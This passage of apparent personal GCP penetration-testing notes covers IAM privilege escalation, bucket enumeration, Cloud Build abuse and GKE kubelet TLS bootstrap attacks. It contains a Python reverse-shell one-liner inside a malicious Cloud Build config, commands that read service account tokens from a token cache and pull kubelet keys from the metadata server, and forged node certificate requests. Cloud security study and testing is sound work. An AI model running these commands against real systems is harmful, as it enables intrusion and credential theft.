href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/run.services.create.py">Exploit Script</a></p><p id="0656fed4-3138-49fc-a136-2b9ee756d087" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudRunDockerImage">Docker Image</a></p><p id="e4d956ae-125c-40a7-9f07-94baef3d15a8" class=""><strong>Create Cloud Scheduler Job</strong></p><ul id="4116df8a-ad75-4caf-8b24-039a9a942d4c" class="bulleted-list"><li style="list-style-type:disc">cloud scheduler is a service for setting up cron jobs</li></ul><ul id="ec87f836-e0d8-4863-9d42-32b99634033d" class="bulleted-list"><li style="list-style-type:disc">create a cron job that performs some task on the behalf of a higher-privileged service account<ul id="4e447691-c9b2-4bc8-b68d-f716fa8e1cff" class="bulleted-list"><li style="list-style-type:circle">e.g. to create a new storage bucket:</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1da324c5-d652-4814-8731-a5b3b6e42383" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">gcloud scheduler jobs create http test --schedule=&#x27;* * * * *&#x27; --uri=&#x27;https://storage.googleapis.com/storage/v1/b?project=&lt;PROJECT-ID&gt;&#x27; --message-body &quot;{&#x27;name&#x27;:&#x27;new-bucket-name&#x27;}&quot; --oauth-service-account-email high_priv-compute@developer.gserviceaccount.com --headers Content-Type=application/json</code></pre></li></ul><p id="6647fb8b-5ff7-482d-bf1e-9185203266b3" class="">Necessary permissions:</p><ol type="1" id="27832b8e-8134-4eaa-893f-644a2727429b" class="numbered-list" start="1"><li><code>cloudscheduler.jobs.create</code></li></ol><ol type="1" id="815622ca-777b-4dd9-9c88-7136b3791069" class="numbered-list" start="2"><li><code>cloudscheduler.locations.list</code></li></ol><ol type="1" id="706a74ab-41b6-4ffb-ab22-f2ba2c9f4ff8" class="numbered-list" start="3"><li><code>iam.serviceAccounts.actAs</code></li></ol><h1 id="119ad2e2-17d9-4ee6-9669-66006378c445" class=""><strong>Non-IAM</strong></h1><p id="cb669f06-6b49-4dcb-b056-d6485cbed75c" class=""><a href="https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2">https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2</a></p><h1 id="9a1e9d4e-fcd3-4142-8503-af8c6448e5a0" class=""><strong>Orgpolicy Set</strong></h1><p id="190d1114-d627-48fa-9360-b28b0231ef0f" class=""><code>orgpolicy.policy.set</code></p><ul id="da89180b-67fe-4436-8b7a-79cce287c357" class="bulleted-list"><li style="list-style-type:disc">not a privesc technique, but can be used to disable constraints</li></ul><figure id="cad47bc6-2fba-4eb4-be19-aae9b40dae3a" class="image"><a href="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%202.png"><img style="width:700px" src="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%202.png"/></a></figure><p id="2111a8af-a4b7-423c-8ff5-4cf2829f2973" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/orgpolicy.policy.set.py">Exploit Script</a></p><h1 id="545afefc-f55e-40e7-8b4a-5ea5107d3623" class=""><strong>Create HMAC Keys</strong></h1><p id="316e6d4f-6a48-47dc-a372-2e300b69d63d" class=""><code>storage.hmacKeys.create</code></p><ul id="464adb5e-da67-4fe7-8e71-2c2876b4f1df" class="bulleted-list"><li style="list-style-type:disc">create HMAC key for higher-privileged service account</li></ul><p id="112ec98f-a732-469e-a961-ae5c75aa722c" class=""><code>gsutil hmac create &lt;SERVICE_ACCOUNT&gt;</code></p><ul id="6b5d0263-ce71-43e8-a423-6c14c8213066" class="bulleted-list"><li style="list-style-type:disc">returns access key and secret key</li></ul><p id="0faf8a76-02eb-4515-a7d6-e1d84cb5dfb5" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/storage.hmacKeys.create.py">Exploit Script</a></p><h1 id="5cffa591-a4d9-46c3-a909-79e7f64c5928" class=""><strong>Create API Keys</strong></h1><p id="2d88df98-6ae2-4905-b88e-01452d7fb6ee" class=""><code>serviceusage.apiKeys.create</code></p><p id="6d0fd361-67ad-4c47-8c8e-d03bca040535" class=""><a href="https://cloud.google.com/docs/authentication/api-keys">https://cloud.google.com/docs/authentication/api-keys</a></p><ul id="ed81b093-8fc6-439b-b08c-cf156f8f6e06" class="bulleted-list"><li style="list-style-type:disc">When API keys are created, they can be used by any entity from anywhere by default<ul id="85458927-1aa9-4124-8f55-0ff826ee5a11" class="bulleted-list"><li style="list-style-type:circle">API and application restrictions should be placed on API keys to restrict their usage to only be used by the intentional sources</li></ul></li></ul><figure id="5daf8346-b994-4e8e-8d2a-124b812aa185" class="image"><a href="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%203.png"><img style="width:700px" src="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%203.png"/></a></figure><p id="9c454d03-f293-4587-ab61-768607940392" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/serviceusage.apiKeys.create.py">Exploit Script</a></p><h1 id="ad0fa5cd-9344-493a-a70d-9a12881dfb7a" class=""><strong>List API keys</strong></h1><p id="d237179a-245c-4e3f-922d-643d44ace849" class=""><code>serviceusage.apiKeys.list</code></p><ul id="6f6b581d-da40-41c6-8b21-467b15da3820" class="bulleted-list"><li style="list-style-type:disc">list API keys in project</li></ul><p id="6cc20348-b383-4d0f-8779-5857384ab668" class=""><code>gcloud services api-keys list</code></p><p id="559993ac-4cdc-4555-a96c-c223dc8e4031" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/serviceusage.apiKeys.list.py">Exploit Script</a></p><h1 id="94d34685-7966-4aa7-b702-0e31bc5454ec" class=""><strong>Red Flag Permissions</strong></h1><p id="0e0d97be-be07-4daa-b9f1-0b52313b5f46" class="">Can likely privesc if you have one of the following permissions</p><table id="1abc2f9a-d3c2-4599-b971-561170e4410b" class="simple-table"><tbody><tr id="6df8f089-a36e-47e3-8664-2b606d87dff2"><td id="txvo" class=""><strong>Permission</strong></td><td id="Z`iU" class=""><strong>Description</strong></td></tr><tr id="a3b657d9-2da8-4a42-a3a1-7ca34fa346e0"><td id="txvo" class=""><code>resourcemanager.organizations.setIamPolicy</code></td><td id="Z`iU" class="">Attach IAM role to user in organization</td></tr><tr id="c793e57a-b7c2-40a9-91d5-f8ffefa70072"><td id="txvo" class=""><code>resourcemanager.folders.setIamPolicy</code></td><td id="Z`iU" class="">Attach IAM role to user in folder</td></tr><tr id="c8882306-9d6d-4331-afd7-03cd96353b9e"><td id="txvo" class=""><code>resourcemanager.projects.setIamPolicy</code></td><td id="Z`iU" class="">Attach IAM role to user in project</td></tr><tr id="0c5518df-0bb0-444e-bee8-2da6f6c0a337"><td id="txvo" class=""><code>iam.serviceAccounts.setIamPolicy</code></td><td id="Z`iU" class="">Attach IAM role to user at service account level</td></tr><tr id="871a60a8-3f01-4afb-8851-022cf5d2e124"><td id="txvo" class=""><code>cloudfunctions.functions.setIamPolicy</code></td><td id="Z`iU" class="">Change policy of Cloud Function so that it can be invoked</td></tr><tr id="ad8f7fde-d970-4659-9a1d-9b8d591c6726"><td id="txvo" class=""><code>*.setIamPolicy</code></td><td id="Z`iU" class="">Can update policy for resource / asset within environment.</td></tr></tbody></table><h1 id="d91ead87-a216-4464-a584-b5f2877a40d3" class=""><strong>Google Storage</strong></h1><p id="1ef97070-8050-41e5-9f9d-933ffe7dad42" class=""><a href="https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/">https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/</a></p><ul id="0e8a1ca3-5dc4-455b-8bfe-e8bf706fcd26" class="bulleted-list"><li style="list-style-type:disc">Google version of AWS S3</li></ul><ul id="6335d97c-1089-4fb3-89ee-8d5b0868fe4b" class="bulleted-list"><li style="list-style-type:disc">S3 bucket = Google Storage bucket</li></ul><ul id="ae35dd7a-7e98-4b44-b07b-14004a6d90c6" class="bulleted-list"><li style="list-style-type:disc">buckets are private by default on creation</li></ul><h1 id="e58d1577-2b92-4a58-ad25-f8b3a117c813" class=""><strong>Enumeration</strong></h1><ul id="22046024-233c-4931-9ea0-5bd75e5c5dac" class="bulleted-list"><li style="list-style-type:disc">faster to enumerate buckets by querying the HTTP endpoint than using <code>gsutil</code></li></ul><ul id="f0616fda-a9b8-4afc-af85-e5b6cef6868c" class="bulleted-list"><li style="list-style-type:disc"><code>HEAD</code> requests made to <code>https://www.googleapis.com/storage/v1/b/&lt;BUCKET_NAME&gt;</code> endpoint<ul id="b478aa0c-a2fc-4b59-b946-efe5398203c7" class="bulleted-list"><li style="list-style-type:circle">nonexistent bucket if response is <code>404</code> or <code>400</code></li></ul></li></ul><ul id="a3d0cfa7-0146-4a76-b214-d396110a4ec7" class="bulleted-list"><li style="list-style-type:disc">public listing of buckets occur when <code>storage.objects.list</code> is given to <code>allUsers</code><ul id="0a44eef8-4c7a-4929-8710-73e4b66f3912" class="bulleted-list"><li style="list-style-type:circle"><code>allUsers</code> means anyone on the internet (both authenticated and unauthenticated)</li></ul></li></ul><ul id="f1ae16f9-9143-49aa-9aab-4e0d2a5df0b8" class="bulleted-list"><li style="list-style-type:disc">permissions on a bucket can be found via the <code>TestIAMPermissions</code> API<ul id="8a742b26-aef6-46c7-a39b-73edd5c4a898" class="bulleted-list"><li style="list-style-type:circle"><code>https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam/testPermissions?permissions=&lt;PERMISSION&gt;</code></li></ul><ul id="8d7222df-9430-4b6c-9195-ccd364fbc70b" class="bulleted-list"><li style="list-style-type:circle"><code>https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam/testPermissions?permissions=storage.buckets.delete&amp;permissions=storage.buckets.get&amp;permissions=storage.buckets.getIamPolicy&amp;permissions=storage.buckets.setIamPolicy&amp;permissions=storage.buckets.update&amp;permissions=storage.objects.create&amp;permissions=storage.objects.delete&amp;permissions=storage.objects.get&amp;permissions=storage.objects.list&amp;permissions=storage.objects.update</code></li></ul><ul id="3ca6a64b-4793-4757-8bf0-4ccad1a1b94d" class="bulleted-list"><li style="list-style-type:circle">not all permissions will be listed as some are not specific to Google Storage (e.g. <code>resourcemanager.projects.list</code></li></ul></li></ul><ul id="3f1cf412-2d58-4848-8091-ed3e00ea767f" class="bulleted-list"><li style="list-style-type:disc"><code>allAuthenticatedUsers</code> is any user on internet that has authenticated to Google Cloud (has potential for misconfiguration!)<ul id="35a038cf-44c5-4c7b-b8f3-64fab4e44ad4" class="bulleted-list"><li style="list-style-type:circle">From Google (<a href="https://cloud.google.com/iam/docs/overview">https://cloud.google.com/iam/docs/overview</a>): <code>Note: Consider using allUsers, as described on this page, rather than allAuthenticatedUsers. In many cases, granting access to all users is no more of a security risk than granting access only to authenticated users.</code></li></ul></li></ul><h1 id="928f329d-ec0f-4047-94e2-90055a476116" class=""><strong>Set Bucket Policy</strong></h1><ul id="8af7a43b-4bb8-41cd-bab0-95349e092062" class="bulleted-list"><li style="list-style-type:disc">can privesc to <code>storage.admin</code> if you can read the bucket policy (<code>storage.buckets.getIamPolicy</code>) and set the IAM policy (<code>storage.buckets.setIamPolicy</code> )<ul id="010b0d36-ac16-48f4-8787-8dcded5ca64b" class="bulleted-list"><li style="list-style-type:circle"><code>storage.buckets.getIamPolicy</code> is not necessary, but otherwise you risk overwriting the original policy (could lead to errors in environment)</li></ul></li></ul><p id="9f849684-6aa5-4cfa-b93e-15ff38bb9c75" class=""><strong>Privesc command</strong>: <code>gsutil ch group:&lt;YOUR_CURRENT_GROUP&gt;:admin gs://&lt;BUCKET&gt;</code></p><h1 id="b6c0748c-2209-4958-a2ea-f85158f43566" class=""><strong>Cloud Build</strong></h1><p id="a409c16c-488b-4dd4-bb25-fe2615133c38" class=""><a href="https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/">https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/</a></p><ol type="1" id="188822de-b792-4fec-ac0a-3d4bfd9292c6" class="numbered-list" start="1"><li>Provide code for Cloud Build which gets executed during build process (RCE)</li></ol><ol type="1" id="8baae2d9-01d8-424f-9c70-d3ef45d57764" class="numbered-list" start="2"><li>Get access token for cloudbuild service account</li></ol><ul id="402edc60-90ef-433f-8d0f-d8288ea8ca1d" class="bulleted-list"><li style="list-style-type:disc">must have permission to start a new build to escalate privileges (<code>cloudbuild.builds.create</code>)</li></ul><p id="57f51a33-b8da-46cc-90dd-fce024ebdb27" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py">Exploit Script</a></p><h1 id="1cc250e8-0f12-4045-9cdf-cbe3227911d1" class=""><strong>Methodology</strong></h1><ul id="105e0aaf-ce72-4c66-a1a4-8f05469f4655" class="bulleted-list"><li style="list-style-type:disc">create malicious <code>.yaml</code> file:</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="384c59f2-a49b-4c78-b40f-cf9bfe55dbe3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">steps:
- name: &#x27;python&#x27;
  entrypoint: &#x27;python&#x27;
  args:
  - -c
  - import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP-ADDRESS&quot;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</code></pre><p id="eb8e23bc-de75-4217-9637-0aae878d5e3a" class="">Run the following command:<code>gcloud builds submit --config ./build.yaml .</code></p><p id="7b9979ae-189e-4f8a-b0db-0c5f87937c74" class="">Then, read <code>/root/tokencache/gsutil_token_cache</code> to get Cloud Build service account token</p><ul id="d39e756d-e753-4a02-91da-0414e88bd266" class="bulleted-list"><li style="list-style-type:disc">check scope of token here: <code>https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=</code></li></ul><h1 id="655cbdf8-c978-4baf-a0c6-0e15874fdd16" class=""><strong>Remediation</strong></h1><ul id="6cb74ef8-d05f-4a09-9bac-3acc60f6e79b" class="bulleted-list"><li style="list-style-type:disc">don’t provide <code>cloudbuild.build.create</code> unless you’re okay with the permissions the Cloud Build service account grants</li></ul><ul id="1cfaaffb-6fb3-4a25-b639-8ce102ba03f9" class="bulleted-list"><li style="list-style-type:disc">consider reducing the permissions for the CloudBuild service account</li></ul><h1 id="9098aff3-bad4-4167-bdf6-3a754b196da5" class=""><strong>GKE</strong></h1><p id="c31aea84-fc64-4344-908b-c296f15a2bba" class=""><a href="https://www.4armed.com/blog/hacking-kubelet-on-gke/">https://www.4armed.com/blog/hacking-kubelet-on-gke/</a></p><p id="d7ea365f-9063-4564-b4a7-96c379215e85" class=""><a href="https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/">https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/</a></p><h1 id="dbb7cb0b-d420-4bcd-a81b-67db3a208957" class=""><strong>Kubernetes Threat Matrix</strong></h1><p id="99d3b00b-c4eb-412d-8bae-fc3a0f3b3add" class=""><a href="https://www.microsoft.com/en-us/security/blog/2020/04/02/attack-matrix-kubernetes/">https://www.microsoft.com/en-us/security/blog/2020/04/02/attack-matrix-kubernetes/</a></p><figure id="7b9c377d-e6af-4bf9-bc7d-b4ba9dbef1a4" class="image"><a href="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%204.png"><img style="width:700px" src="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%204.png"/></a></figure><h1 id="bec422d0-e6e1-4098-89b6-1308185378b7" class=""><strong>Kubelet</strong></h1><p id="6c32a068-7d9b-4e56-b0b0-831576038e46" class="">Retrieve <code>apiserver.crt</code>, <code>kubelet.crt</code>, and <code>kubelet.key</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3c62597a-2c06-4785-b989-4d1079bfe213" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl -s -H &#x27;Metadata-Flavor: Google&#x27; &#x27;http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env&#x27; | grep ^KUBELET_CERT | awk &#x27;{print $2}&#x27; | base64 -d &gt; kubelet.crt
curl -s -H &#x27;Metadata-Flavor: Google&#x27; &#x27;http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env&#x27; | grep ^KUBELET_KEY | awk &#x27;{print $2}&#x27; | base64 -d &gt; kubelet.key
curl -s -H &#x27;Metadata-Flavor: Google&#x27; &#x27;http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env&#x27; | grep ^CA_CERT | awk &#x27;{print $2}&#x27; | base64 -d &gt; apiserver.crt</code></pre><ul id="8208887b-9b90-40b8-9c26-96f619b9f179" class="bulleted-list"><li style="list-style-type:disc">use <code>$KUBERNETES_PORT_443_TCP_ADDR</code> env variable to find Kubernetes master IP address</li></ul><h1 id="699e8e76-17b9-447c-b624-cb6e7ce099e9" class=""><strong>TLS Bootstrapping</strong></h1><p id="0b38a3bd-4aeb-4238-ab33-2136d779d9cf" class="">TLS bootstrap privesc steps:</p><figure id="7208cd12-9857-432b-a012-412dbe949860" class="image"><a href="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%205.png"><img style="width:700px" src="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%205.png"/></a></figure><ul id="0b21c63c-0b54-4653-8e98-16b1e85b9a35" class="bulleted-list"><li style="list-style-type:disc">creds give permissions to the <code>CertificateSigningRequest</code> object</li></ul><p id="1e69c565-02a2-4c5d-b3af-3857287d11bd" class="">List certificate signing request (CSRs) for cluster nodes:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="58ef2e05-98f8-4345-9f94-f893d597a7ee" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get certificatesigningrequests</code></pre><p id="42f158f7-167f-4207-a35a-609cce945cd0" class="">Obtain client certificate that kubelet uses for its normal functions:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="09d5e63c-c7cb-4172-8914-6c4c35a5092f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get certificatesigningrequests &lt;NODE_NAME&gt; -o yaml</code></pre><ul id="13a5d4e8-c4f1-4e36-b287-7a7e4366f846" class="bulleted-list"><li style="list-style-type:disc">in the output of this command, the certificate is in the <code>status.certificate</code> field (base64 encoded)</li></ul><p id="ac488539-6c33-4963-9e6e-8bc49dd9c4b6" class="">Base64 decode client certificate:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c3904651-6272-4b25-bd17-2777c94d3963" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get certificatesigningrequests &lt;NODE_NAME&gt; -o jsonpath=&#x27;{.status.certificate}&#x27; | base64 -d &gt; node.crt</code></pre><ul id="b442eaa9-22f3-404e-b091-4b339e910486" class="bulleted-list"><li style="list-style-type:disc">cannot yet get pod with client certificate cause the private key rotates every time before a new CSR is created (using <code>LoadOrGenerateKeyFile</code> function)</li></ul><ul id="a5a3dd1b-fb51-474f-9a2a-fe8a733fd989" class="bulleted-list"><li style="list-style-type:disc">must create own key, generate CSR, and submit the CSR and key</li></ul><p id="e5a30e28-47fa-4e9c-b45e-23c67d38c3f8" class=""><strong>Become a Node</strong></p><p id="a451e8d5-2274-491f-8c2a-767d14aca4aa" class="">Create private key:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1d45a140-d4d1-4ccd-8789-762d35040c18" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">openssl req -nodes -newkey rsa:2048 -keyout k8shack.key -out k8shack.csr -subj &quot;/O=system:nodes/CN=system:node:&lt;NODE_NAME&gt;&quot;</code></pre><ul id="f94cb6e3-e17a-4563-a0b3-9f2c8791f3c2" class="bulleted-list"><li style="list-style-type:disc">note that you can specify the node name and it will work because Kubernetes has no restrictions for which certificates a node can request</li></ul><p id="6006eabb-f2f7-4e79-a1fd-003b1b6b64cf" class="">Submit key to API:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9ae9e0b4-bd1e-45fb-b506-dd999ffbc263" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">cat &lt;&lt;EOF | kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} create -f -
apiVersion: certificates.k8s.io/v1beta1
kind: CertificateSigningRequest
metadata:
  name: node-csr-$(date +%s)
spec:
  groups:
  - system:nodes
  request: $(cat k8shack.csr | base64 | tr -d &#x27;\n&#x27;)
  usages:
  - digital signature
  - key encipherment
  - client auth
EOF</code></pre><p id="cfcb69fc-8c1b-4460-bd1a-5f4741ac7deb" class="">Get pod:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0528261a-8c7d-4f1b-8c7f-44e52aabe9f4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get csr &lt;NODE_NAME&gt;</code></pre><p id="d58288d4-6beb-40f4-bdcf-b9d921108441" class="">Get certificate:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23a2d93b-5a76-420f-9235-8bf1a8ae6f16" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get csr &lt;NODE_NAME&gt; -o jsonpath=&#x27;{.status.certificate}&#x27; | base64 -d &gt; node2.crt</code></pre><p id="ef3c4197-2518-46c7-a8a7-5318000a0e6c" class="">Access API server:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" 